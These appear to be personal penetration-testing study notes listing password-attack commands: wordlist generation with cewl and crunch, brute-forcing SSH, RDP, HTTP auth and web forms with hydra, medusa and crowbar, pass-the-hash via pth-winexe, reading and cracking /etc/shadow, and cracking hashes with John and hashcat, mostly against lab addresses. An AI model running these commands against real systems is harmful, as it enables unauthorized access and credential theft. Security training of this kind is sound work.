### Cewl
```
cewl https://www.tesla.cn -v -a -m(min) 1 -w tesla.txt
```

### Crunch
```
crunch 8(min) 8(max) -t ,@@^^%%%

PLACEHOLDER	CHARACTER TRANSLATION
@	Lower case alpha characters
,	Upper case alpha characters
%	Numeric characters
^	Special characters including space

crunch 4 6 0123456789ABCDEF(char set) -o crunch.txt
```
### Medusa
###### HTTP htaccess Attack with Medusa
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
medusa -d(check out supported modules)
```

### Crowbar
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
### Hydra
>Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user(post_form_key)=admin&pass(post_form_key)=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f(stop the attack when the first successful result is found)
```
### Hash Identification
```
hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
```
### Passing the Hash in Windows
>Scenario:
>cracking password hashes can be very time-consuming and is often not feasible without powerful hardware. However, sometimes we can leverage Windows-based password hashes without resorting to a laborious cracking process.  
During our assessment, we discovered a local administrative account that is enabled on multiple systems. We exploited a vulnerability on one of these systems and have gained SYSTEM privileges, allowing us to dump local LM and NTLM hashes. We have copied the local administrator NTLM hash and can now use it instead of a password to gain access to a different machine, which has the same local administrator acount and password
```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
### Cryptography
> $1$: MD5-based crypt ('md5crypt')  
> $2$: Blowfish-based crypt ('bcrypt')[^bcrypt]  
> $sha1$: SHA-1-based crypt ('sha1crypt')  
> $5$: SHA-256-based crypt ('sha256crypt')  
> $6$: SHA-512-based crypt ('sha512crypt')  

md5sum plain-text, sha1sum plain-text, sha256sum plain-text, sha512sum plain-text  
> https://crackstation.net/ (unsalted hash crack)  
###### Generate salted hash
mkpasswd -m sha512crypt foobar -S "M3vwJPAueK2a1vNM"

###### Symmetric
gpg -c --cipher-algo blowfish blowfish.plain  
gpg --decrypt blowfish.plain.gpg  
gpg -c --cipher-algo aes256 aes256.plain  
gpg --decrypt aes256.plain.gpg

###### Asymmetric 
> https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html  

gpg --gen-key(enter realname--Offsec and email--test@example.com for identification)  
gpg --output example-pub.asc --armor --export Offsec  
gpg --recipient Offsec --encrypt plain.txt  
gpg --decrypt plain.txt.gpg  
gpg --import melanie-private.asc  
gpg --decrypt decrypt-me.gpg(need to enter passphrase)  

###### John the ripper
john --wordlist=rockyou.txt hash  
john -form=dynamic='sha1(md5(sha512($p.$s).$p).$s)' --wordlist=rockyou.txt hash  
john --wordlist=rockyou.txt user_shadow_hash($6$VvN1wBiLLmqWtRXY$oPzxsQbXqdzIISj5NzmKeiUcfXGvFJzqi9YFCzOtdOOI4yOqXm.UBiP7oLeDH8kZUgCtwBwY.YcbqVx7RWlj51)  
john hash.txt --format=NT  
>We have two machines, each with an 8-core CPU. On the first machine we would set the --fork=8 and --node=1-8/16 options, instructing John to create eight processes on this machine, split the supplied wordlist into sixteen equal parts, and process the first eight parts locally. On the second machine, we could use --fork=8 and --node=9-16 to assign eight processes to the second half of the wordlist.

###### John crack shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt  
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt  

### Hashcat
```
hashcat -a 0(dictionary) -m 13000 hash wordlist
```
###### Combine each char set(114) with each number(1000) = 114000
```
/usr/lib/hashcat-utils/combinator.bin flag2.txt numbers.txt > hash.txt
```
